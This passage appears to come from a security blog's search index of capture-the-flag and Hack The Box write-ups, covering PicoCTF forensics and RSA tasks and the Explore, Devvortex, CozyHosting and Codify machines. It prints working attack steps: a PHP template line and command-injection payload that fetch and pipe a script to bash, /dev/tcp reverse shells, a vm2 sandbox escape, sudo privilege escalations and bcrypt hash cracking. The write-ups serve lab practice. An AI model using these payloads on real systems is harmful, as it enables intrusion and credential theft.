flag7069636f4354467b66316c656e406d335f6d406e3170756c407431306e5f6630725f3062326375723137795f39353063346665657d0aEncoded Flag is : 7069636f4354467b66316c656e406d335f6d406e3170756c407431306e5f6630725f3062326375723137795f39353063346665657d0a let’s go to cyberchef and decode this HEX text and we get the flag: picoCTF{f1len@m3_m@n1pul@t10n_f0r_0b2cur17y_950c4fee}" }, { "title": "Explore from HTB", "url": "/posts/Explore-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Explore from HTBnmapgave this:PORT STATE SERVICE VERSION2222/tcp open ssh (protocol 2.0)| ssh-hostkey:|_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)| fingerprint-strings:| NULL:|_ SSH-2.0-SSH Server - Banana Studio42135/tcp open http ES File Explorer Name Response httpd|_http-server-header: ES Name Response Server|_http-title: Site doesn't have a title (text/html).59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older|_http-title: Site doesn't have a title (text/plain).1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port2222-TCP:V=7.94SVN%I=7%D=9/1%Time=66D37B10%P=x86_64-pc-linux-gnu%r(SF:NULL,24,\"SSH-2\\.0-SSH\\x20Server\\x20-\\x20Banana\\x20Studio\\r\\n\");Service Info: Device: phonePORT STATE SERVICE VERSION2222/tcp open ssh (protocol 2.0)| ssh-hostkey:|_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)| fingerprint-strings:| NULL:|_ SSH-2.0-SSH Server - Banana Studio5555/tcp filtered freecivsearching things on portswe get to thishttps://www.speedguide.net/port.php?port=59777 — 59777 portmsf6 &gt; search es file explorerMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/es_file_explorer_open_port 2019-01-16 normal No ES File Explorer Open Portmsf6 &gt; use auxiliary/scanner/http/es_file_explorer_open_portmsf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; optionsModule options (auxiliary/scanner/http/es_file_explorer_open_port): Name Current Setting Required Description ---- --------------- -------- ----------- ACTIONITEM no If an app or filename if required by the action Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html RPORT 59777 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections THREADS 1 yes The number of concurrent threads (max one per host) VHOST no HTTP server virtual hostmsf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set RHOSTS 10.10.10.247RHOSTS =&gt; 10.10.10.247msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; exploit[+] 10.10.10.247:59777 - Name: VMware Virtual Platform[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedmsf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; show actionsAuxiliary actions: Name Description ---- ----------- APPLAUNCH Launch an app. ACTIONITEM required. =&gt; GETDEVICEINFO Get device info GETFILE Get a file from the device. ACTIONITEM required. LISTAPPS List all the apps installed LISTAPPSALL List all the apps installed LISTAPPSPHONE List all the phone apps installed LISTAPPSSDCARD List all the apk files stored on the sdcard LISTAPPSSYSTEM List all the system apps installed LISTAUDIOS List all the audio files LISTFILES List all the files on the sdcard LISTPICS List all the pictures LISTVIDEOS List all the videosmsf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set action LISTPICSaction =&gt; LISTPICSmsf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; exploit[+] 10.10.10.247:59777 concept.jpg (135.33 KB) - 4/21/21 02:38:08 AM: /storage/emulated/0/DCIM/concept.jpg anc.png (6.24 KB) - 4/21/21 02:37:50 AM: /storage/emulated/0/DCIM/anc.png creds.jpg (1.14 MB) - 4/21/21 02:38:18 AM: /storage/emulated/0/DCIM/creds.jpg 224_anc.png (124.88 KB) - 4/21/21 02:37:21 AM: /storage/emulated/0/DCIM/224_anc.pngmsf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set action GETFILEaction =&gt; GETFILEmsf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set ACTIONITEM /storage/emulated/0/DCIM/creds.jpgACTIONITEM =&gt; /storage/emulated/0/DCIM/creds.jpgmsf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; exploitdownloading the photo and seeing it we get credentials for sshThe password is Kr1sT!5h@Rp3xPl0r3!" }, { "title": "eavesdrop from PicoCTF", "url": "/posts/Eavesdrop-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "eavesdrop from PicoCTFpage DescriptionDownload this packet capture and find the flag. Download packet capture HintsAll we know is that this packet capture includes a chat conversation and a file transfer.So The file is .pcap. Let’s search trough it.First i went trough HTTP and found nothing and i was left with TCP, i followed stream and in 0 stream i found the conversation as mentioned in Hints:Hey, how do you decrypt this file again?You're serious?Yeah, I'm serious*sigh* openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123Ok, great, thanks.Let's use Discord next time, it's more secure.C'mon, no one knows we use this program like this!Whatever.Hey.Yeah?Could you transfer the file to me again?Oh great. Ok, over 9002?Yeah, listening.Sent itGot it.You're unbelievableGreat we found how the flag is encrpted:openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123Now lets go up the stream and on stream number 2 i found the salted flag, convert it to raw and save it as file.des3 then run the code mentioned above. After all that you will get the flag:picoCTF{nc_73115_411_5786acc3}" }, { "title": "Disk, Disk, sleuth! II from PicoCTF", "url": "/posts/Disk,-disk,-sleuth!-II-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Disk, Disk, sleuth! II from PicoCTFpage #DescriptionAll we know is the file with the flag is named down-at-the-bottom.txt… Disk image: dds2-alpine.flag.img.gzIt’s .gz file so we use gunzip to unzip it.gunzip dds2-alpine.flag.imgnow we are left with dds2-alpine.flag.img. It’s an .img file so i thought maybe there is something hidden in it. I usedbinwalk -e dds2-alpine.flag.imgAnd i was right. Binwalk extracted file-dds2-alpine.flag.img.extractedBecause we know what file we are searching for it’s going to be easy:$ find . -name \"down-at-the-bottom.txt\"./ext-root/root/down-at-the-bottom.txtNow we know where our flag is hidden and head to that directory. The flag is : _ _ _ _ _ _ _ _ _ _ _ _ _ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ ( p ) ( i ) ( c ) ( o ) ( C ) ( T ) ( F ) ( { ) ( f ) ( 0 ) ( r ) ( 3 ) ( n ) \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ _ _ _ _ _ _ _ _ _ _ _ _ _ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ ( s ) ( 1 ) ( c ) ( 4 ) ( t ) ( 0 ) ( r ) ( _ ) ( n ) ( 0 ) ( v ) ( 1 ) ( c ) \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ _ _ _ _ _ _ _ _ _ _ _ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ ( 3 ) ( _ ) ( 6 ) ( 9 ) ( a ) ( b ) ( 1 ) ( d ) ( c ) ( 8 ) ( } ) \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ picoCTF{f0r3ns1c4t0r_n0v1c3_69ab1dc8}" }, { "title": "Devvortex from HTB", "url": "/posts/Devvortex-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Devvortex from HTBpageNmapgave this:nmap -sCV --min-rate 4000 10.10.11.242Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 15:06 +04Nmap scan report for devvortex.htb (10.10.11.242)Host is up (0.081s latency).Not shown: 919 filtered tcp ports (no-response), 79 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: DevVortex|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 16.90 secondsNothing unusual.Add this to /etc/hosts:10.10.11.242 devvortex.htbAnd access the site. After that I used ffufto list the subdomains and got this:ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomainstop100000.txt:FUZZ -u http://devvortex.htb -H 'Host: FUZZ.devvortex.htb' -fw 4 - t 100* FUZZ: devAnd then add that to /etc/hosts:10.10.11.242 dev.devvortex.htband go to that subdomain. Also use ffufon that for directory listing:ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://dev.devvortex.htb/FFUZ -ic -t 100imagestemplatesmediahomemodulespluginsincludeslanguagecomponentsapicachelibrariestmplayoutsadministratorOne we need to exploit is administratordirectory. Go to dev.devvortex.htb/administratorand you are greeted with loginpage. This page works on Joomlawhich is written on the bottom of the page. Use program called joomscanto get the version of joomla:joomscan -u http://dev.devvortex.htb[+] FireWall Detector[++] Firewall not detected[+] Detecting Joomla Version[++] Joomla 4.2.6Version is 4.2.6.Then search exploit for Joomla 4.2.6and i got found Githubrepository for the exploit.https://github.com/ThatNotEasy/CVE-2023-23752.gitI cloned it, then pip install -r requirements.txtand then started the script:[CVE-2023-23752] - Authentication Bypass Information Leak on Joomla![1] - Single Scan[2] - Massive Scan[CVE-2023-23752]: 1IP/Domain: http://dev.devvortex.htb/[CVE-2023-23752] - http://dev.devvortex.htb/ .: [Scanning!][+] Domain : http://dev.devvortex.htb/[+] Database Type : mysqli[+] Database Prefix : sd4fg_[+] Database : joomla[+] Hostname : localhost[+] Username : lewis[+] Password : P4ntherg0t1n5r3c0n##Password —- P4ntherg0t1n5r3c0n##Username —- lewisUse that credentials to login.In usersdirectory you can see that lewisis superuser.To get the reverse shellyou need to modify some code. I did it on error.phpin system &gt; site templates &gt; cassiopeia Details and Files &gt; error.php at the end of the script i added this script:&lt;?php system(\"curl &lt;your_ip&gt;:&lt;your_port&gt;/&lt;reverse shell script&gt;.sh|bash\"); ?&gt;You will use this to curl the reverse shellscript that will be on your PC, with python server.Modify that script however you want. Then click save and close.Go to your terminal and locally create shell.sh:echo -e '#!/bin/bash\\nsh -i &gt;&amp; /dev/tcp/&lt;your_ip&gt;/&lt;port&gt; 0&gt;&amp;1' &gt; shell.shfile is created. Now in same directory start simple http server. Then with curldo this:curl -k \"http://dev.devvortex.htb/templates/cassiopeia/error.php/error\" -K, --config &lt;file&gt; Specify a text file to read curl arguments from. The command line arguments found in the text file are used as if they were provided on the command line.This will execute your written command and on NetCatyou will get the connection.nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.3] from (UNKNOWN) [10.10.11.242] 47212sh: 0: can't access tty; job control turned off$ python3 -c 'import pty;pty.spawn(\"/bin/sh\")'$ lslsLICENSE.txt cli includes media tmpREADME.txt components index.php modules web.config.txtadministrator configuration.php language pluginsapi htaccess.txt layouts robots.txtcache images libraries templatesTo read the file we have to become the loganuser.$ ss -tlpnss -tlpnState Recv-Q Send-Q Local Address:Port Peer Address:Port ProcessLISTEN 0 70 127.0.0.1:33060 0.0.0.0:*LISTEN 0 151 127.0.0.1:3306 0.0.0.0:*This shows that there is mysqldatabase open locally on 3306port so we need to access it.It will need password and username so we have to find it. It is located in configuration.php OR you can use the already gotten password and username: lewisand P4ntherg0t1n5r3c0n##.First do this:$ script /dev/null -c bashscript /dev/null -c bashScript started, file is /dev/null # and thenwww-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -pmysql -u lewis -pEnter password: P4ntherg0t1n5r3c0n##WelcomeThen with basic knowledge of mysqlcommands find the password for logan:mysql&gt; Show databases;Show databases;+--------------------+| Database |+--------------------+| information_schema || joomla || performance_schema |+--------------------+mysql&gt; use joomlamysql&gt; show tables;+-------------------------------+| Tables_in_joomla |+-------------------------------+................| sd4fg_users |..................................mysql&gt; select * from sd4fg_users;logan $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12With hashidwe learn what type of hash it is, and then use hashcaton it:$ hashid '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'Analyzing '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'[+] Blowfish(OpenBSD)[+] Woltlab Burning Board 4.x[+] bcrypt$ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txthashcat (v6.2.6) starting$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromuchoPassword for loganuser is tequieromucho.After that become loganuser and read the user.txt:su loganPassword: tequieromuchologan@devvortex:/var/www/dev.devvortex.htb$ cat /home/logan/user.txtcat /home/logan/user.txtcc29aa85aa57d20bae0aaf6992c77bbbUser Flag: cc29aa85aa57d20bae0aaf6992c77bbb***Then learn what you can do with root's permission:sudo -l[sudo] password for logan: tequieromuchoMatching Defaults entries for logan on devvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser logan may run the following commands on devvortex: (ALL : ALL) /usr/bin/apport-cliWith version of apport-climaybe we can do privilege escalation:/usr/bin/apport-cli --version2.20.11After bit of searching i decided to read walktroughbecause i didn’t understand shitand i got this.ps -uxlogan 1774 0.0 0.2 19044 9644 ? Ss 07:40 0:00 /lib/systemd/# take the PID and use it for privilege escalationsudo /usr/bin/apport-cli -f -P 1774*** Collecting problem informationThe collected information can be sent to the developers to improve theapplication. This might take a few minutes.......*** It seems you have modified the contents of \"/etc/systemd/journald.conf\". Would you like to add the contents of it to your bug report?What would you like to do? Your options are: Y: Yes N: No C: CancelPlease choose (Y/N/C): yy^J*** It seems you have modified the contents of \"/etc/systemd/resolved.conf\". Would you like to add the contents of it to your bug report?What would you like to do? Your options are: Y: Yes N: No C: CancelPlease choose (Y/N/C):What would you like to do? Your options are: Y: Yes N: No C: CancelPlease choose (Y/N/C): yy^J....................*** Send problem report to the developers?After the problem report has been sent, please fill out the form in theautomatically opened web browser.What would you like to do? Your options are: S: Send report (736.5 KB) V: View report K: Keep report file for sending later or copying to somewhere else I: Cancel and ignore future crashes of this program version C: CancelPlease choose (S/V/K/I/C):What would you like to do? Your options are: S: Send report (736.5 KB) V: View report K: Keep report file for sending later or copying to somewhere else I: Cancel and ignore future crashes of this program version C: CancelPlease choose (S/V/K/I/C): VV^JWARNING: terminal is not fully functional- (press RETURN)..........................:!/bin/bash!//bbiinn//bbaasshh!/bin/bashroot@devvortex:We are rootnow.**Root Flag is: 267d54cb5bc85bf5cceeca2d27d790af**" }, { "title": "Dear Diary from PicoCTF", "url": "/posts/Dear-Diary-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Dear Diary from PicoCTFpage DescriptionIf you can find the flag on this disk image, we can close the case for good!Download the disk image here.So add the disk file to autopsy. Then Go to keyword searchand search for .txtfiles and see all the file.txt, after that you will get the flag.Skip all the 5 that stands alone that has nothing to do with the flag:picoCTF{1_533_n4m35_80d24b30}" }, { "title": "dachshund Attacks from HTB", "url": "/posts/Dachshund-Attacks-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "dachshund Attacks from PicoCTFpage #DescriptionWhat if d is too small? Connect with nc mercury.picoctf.net 36463.#HintsWhat do you think about my pet? dachshund.jpgWhen i try to connect to NetCat it gives me this :giorgi@darkfears31:~/Desktop/codes$ nc mercury.picoctf.net 36463Welcome to my RSA challenge!e: 31112241294171519915631069920318765874521238124168532913905531116281510964904836626531137188361696775726669633236731800874399678248260264947749912997148601784968269730005634476477862540208930191622619169157075204380154084337158306781664568496237616115649269687570597717334851672153843093195637690313050752117n: 85635598126252735438881888442407668239192050715723339654463069053325509579219538866514020803999770195512118393682906468050212720686445902091367519198257476966342017681992984849960425289791021406002172094425972904591575441946196719352301220657778704847991912101569504824732852113678692431809991409458165613999c: 54705091974349935726942548296315109290257106279595816508356656837164949627539269819937594060225175475478668362010485253394952517007665513305959496959527710482323736166210511879248833789638273135103101901983204721324048645485833687958154041543004697717488420405722769199726337538499734448671801220406476705868From the picture i just downloaded we get nothing but the dog in the .jpg file.After looking at this we need to somehow connect this to The Wiener Attack.After long time of searching i found simple python code of The wiener AttackHere it is:import owienerfrom Crypto.Util.number import long_to_bytes#--------Data--------#N = &lt;n&gt; &lt;----- change Ne = &lt;e&gt; &lt;----- change ec = &lt;c&gt; &lt;----- change C#--------Wiener's attack--------#d = owiener.attack(e, N)if d: m = pow(c, d, N) flag = long_to_bytes(m).decode() print(flag)else: print(\"Wiener's Attack failed.\")If you type your N,e,c this code will decode it and give you the flag: picoCTF{proving_wiener_2635457}" }, { "title": "CozyHosting from HTB", "url": "/posts/CozyHosting-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "CozyHosting from HTBpageNmap gave this:nmap -sCV --min-rate 4000 10.10.11.230Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-09 18:47 +04Nmap scan report for cozyhosting.htb (10.10.11.230)Host is up (0.093s latency).Not shown: 919 filtered tcp ports (no-response), 79 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)|_ 256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Cozy Hosting - HomeNothing Unusual.Added this to /etc/hosts:10.10.11.230 cozyhosting.htbGot to the site and used Gobuster:gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://cozyhosting.htb//index (Status: 200) [Size: 12706]/login (Status: 200) [Size: 4431]/admin (Status: 401) [Size: 97]/logout (Status: 204) [Size: 0]/error (Status: 500) [Size: 73]Accessing all the directories gave me nothing except errorone which said:# Whitelabel Error PageResearching this will get you to Springboot. To list all the directories you can use the spring-boot.txt wordlist:ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/actuator [Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 106ms]actuator/mappings [Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 119ms]actuator/env/lang [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 154ms]actuator/env/path [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 170ms]actuator/env [Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 160ms]actuator/env/home [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 190ms]actuator/health [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 175ms]actuator/sessions [Status: 200, Size: 148, Words: 1, Lines: 1, Duration: 175ms]actuator/beans [Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 180ms]In actuator/sessionsI found cookie for kanderson:\"68BCAFEDE95BEB075339B14CF851D8B3\": \"kanderson\"I inserted the cookieinto cookie editoror you can insert it with inspect:JSESSIONID: 68BCAFEDE95BEB075339B14CF851D8B3The cookie will be different each time.Then went to /admindirectory and i was logged as K.Anderson#### Please noteFor Cozy Scanner to connect the private key that you received upon registration should be included in your host's .ssh/authorised_keys file.This tells me that this:Is an code that is associated with ssh.Create an reverse shellbash script and then start the simple python3 server: echo -e '#!/bin/bash\\nsh -i &gt;&amp; /dev/tcp/&lt;your_ip&gt;/&lt;port&gt; 0&gt;&amp;1' &gt; reverse.sh python3 -m http.server 8000Then run this script on the site:127.0.0.1test;curl${IFS}http://&lt;your_ip&gt;:&lt;port&gt;/reverse.sh|bash;Before you press submit start NetCat listener on port that you typed in the reverse.shfile.Then press submitand you should get connection:$ rlwrap nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.2] from (UNKNOWN) [10.10.11.230] 51272sh: 0: can't access tty; job control turned off$ script /dev/null -c bashScript started, output log file is '/dev/null'.app@cozyhosting:/app$ lscloudhosting-0.0.1.jar$ unzip -d /tmp/app cloudhosting-0.0.1.jarThis will unzip the .jarfile into tmp/appdirectory. Go to that directory and search for the password and username.app@cozyhosting:/tmp/app/BOOT-INF/classes$ cat appcat application.propertiesserver.address=127.0.0.1server.servlet.session.timeout=5mmanagement.endpoints.web.exposure.include=health,beans,env,sessions,mappingsmanagement.endpoint.sessions.enabled = truespring.datasource.driver-class-name=org.postgresql.Driverspring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialectspring.jpa.hibernate.ddl-auto=nonespring.jpa.database=POSTGRESQLspring.datasource.platform=postgresspring.datasource.url=jdbc:postgresql://localhost:5432/cozyhostingspring.datasource.username=postgresspring.datasource.password=Vg&amp;nvzAQ7XxRapp@cozyhosting:/tmp/app/BOOT-INF/classespsqldatabase is running locally and to access that dbyou will need the credentials that’s listed in this file**Username — postgresPassword — Vg&amp;nvzAQ7XxR**Connect to the database and search for usersto get the password.psql -h 127.0.0.1 -U postgresPassword for user postgres: Vg&amp;nvzAQ7XxRpostgres-# \\list\\listWARNING: terminal is not fully functionalPress RETURN to continue List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges-------------+----------+----------+-------------+-------------+----------------------- cozyhosting | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | postgres | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | template0 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgresThe database that seems interesting is cozyhosting.\\connect cozyhostingSSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)You are now connected to database \"cozyhosting\" as user \"postgres\".\\dtWARNING: terminal is not fully functionalPress RETURN to continue List of relations Schema | Name | Type | Owner--------+-------+-------+---------- public | hosts | table | postgres public | users | table | postgresselect * from users;WARNING: terminal is not fully functionalPress RETURN to continue name | password | role-----------+--------------------------------------------------------------+------- kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User admin | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | AdminKanderson's passwordis not interesting to us because he is not listed in /etc/passwdbut joshis listed and admin passwordis for josh. Identify it with hashidand then decryptit with hashcat:hashcat hash -m 3200 /usr/share/wordlists/rockyou.txt..............$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited..............Then go to sshand connect as joshwith password manchesterunited: ssh josh@10.10.11.230 josh@10.10.11.230's password: manchesterunitedYou can get the uset.txt:josh@cozyhosting:~$ lsuser.txtjosh@cozyhosting:~$ cat user.txte6db96f4c67b39fc016f562b86690bb2User Flag is: e6db96f4c67b39fc016f562b86690bb2***Then learn what you can do with root permission:sudo -lUser josh may run the following commands on localhost: (root) /usr/bin/ssh *Then i searched ssh privilege escalationand i found this command on GTFObins:https://gtfobins.github.io/gtfobins/ssh/ssh -o PermitLocalCommand=yes -o 'LocalCommand=/bin/sh' hostThe final command will look like this:sudo /usr/bin/ssh -o PermitLocalCommand=yes -o 'LocalCommand=/bin/sh' josh@127.0.0.1Enter the password for joshand you will become the root.**Root Flag is: c583c160768d95a1198e21666cbf4b54**" }, { "title": "Codify from HTB\"", "url": "/posts/Codify-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Codify from HTBpageNmap gave nothing unusual.Went to the site and saw vm2and then went for vm2 exploitand got to this github:https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244code is:const {VM} = require(\"vm2\");const vm = new VM();const code = `err = {};const handler = { getPrototypeOf(target) { (function stack() { new Error().stack; stack(); })(); }};const proxiedErr = new Proxy(err, handler);try { throw proxiedErr;} catch ({constructor: c}) { c.constructor('return process')().mainModule.require('child_process').execSync('id');}`console.log(vm.run(code));This will show:uid=1001(svc) gid=1001(svc) groups=1001(svc)This means we can execute commands.I went to my terminal and wrote reverse.sh:#!/bin/bashsh -i &gt;&amp; /dev/tcp/10.10.16.4/1234 0&gt;&amp;1Then i started simple server with python3 -m http.server 8000 and then used curlto get the file and execute it:const {VM} = require(\"vm2\");const vm = new VM();const code = `err = {};const handler = { getPrototypeOf(target) { (function stack() { new Error().stack; stack(); })(); }};const proxiedErr = new Proxy(err, handler);try { throw proxiedErr;} catch ({constructor: c}) { c.constructor('return process')().mainModule.require('child_process').execSync('curl http://10.10.16.4:8000/reverse.sh|bash');}`console.log(vm.run(code));This got me connection on NetCat:rlwrap nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.4] from (UNKNOWN) [10.10.11.239] 36178can't access tty; job control turned off$ script /dev/null -c bashsvc@codify:/var/www/contact$ file tfile tickets.dbfile tickets.dbtickets.db: SQLite 3.x database,sqlite3 tickets.dbSQLite version 3.46.0 2024-05-23 13:25:27Enter \".help\" for usage hints.sqlite&gt; .tablestickets userssqlite&gt; select * from users;3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2Password for Joshua —– $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2hashidtold me this:$ hashid '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2'Analyzing '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2'[+] Blowfish(OpenBSD)[+] Woltlab Burning Board 4.x[+] bcryptIt is bcrypt.$ hashcat --force -m 3200 hash /usr/share/wordlists/rockyou.txt$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1Password is spongebob1su joshuapassword: spongebob1cat /home/joshua/user.txt00b4a83c6272242b48ef48b86dce70d7User Flag is: 00b4a83c6272242b48ef48b86dce70d7***sudo -lUser joshua may run the following commands on codify: (root) /opt/scripts/mysql-backup.shAfter analyzing the code:#!/bin/bashDB_USER=\"root\"DB_PASS=$(/usr/bin/cat /root/.creds)BACKUP_DIR=\"/var/backups/mysql\"read -s -p \"Enter MySQL password for $DB_USER: \" USER_PASS/usr/bin/echoif [[ $DB_PASS == $USER_PASS ]]; then /usr/bin/echo \"Password confirmed!\"else /usr/bin/echo \"Password confirmation failed!\" exit 1fi/usr/bin/mkdir -p \"$BACKUP_DIR\"databases=$(/usr/bin/mysql -u \"$DB_USER\" -h 0.0.0.0 -P 3306 -p\"$DB_PASS\" -e \"SHOW DATABASES;\" | /usr/bin/grep -Ev \"(Database|information_schema|performance_schema)\")for db in $databases; do /usr/bin/echo \"Backing up database: $db\" /usr/bin/mysqldump --force -u \"$DB_USER\" -h 0.0.0.0 -P 3306 -p\"$DB_PASS\" \"$db\" | /usr/bin/gzip &gt; \"$BACKUP_DIR/$db.sql.gz\"done/usr/bin/echo \"All databases backed up successfully!\"/usr/bin/echo \"Changing the permissions\"/usr/bin/chown root:sys-adm \"$BACKUP_DIR\"/usr/bin/chmod 774 -R \"$BACKUP_DIR\"/usr/bin/echo 'Done!'This can be exploited:if [[ $DB_PASS == $USER_PASS ]]; thenBecause if $USER_PASSwill be *it will be the root password.* is every string you can do research about \"wild cards\" or visit pwn.college and finish first 2 dojosThis Will leak root passowrdin linux processes and to read it we need to use pspy64swhich can be downloaded from this github repository:wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64sPspyis a powerful command-line tool specifically designed to monitor Linux processes without the need for administrative privileges. With Pspy, you can obtain valuable insights into the activities and behaviors of processes running on a Linux system.One of the key advantages of pspy is its ability to operate without root or administrative access, making it useful for security audits, forensics investigations, and general system monitoring. It allows you to observe process-to-process interactions, monitor the creation and termination of processes, and even capture command-line arguments passed to specific processes.***Open another 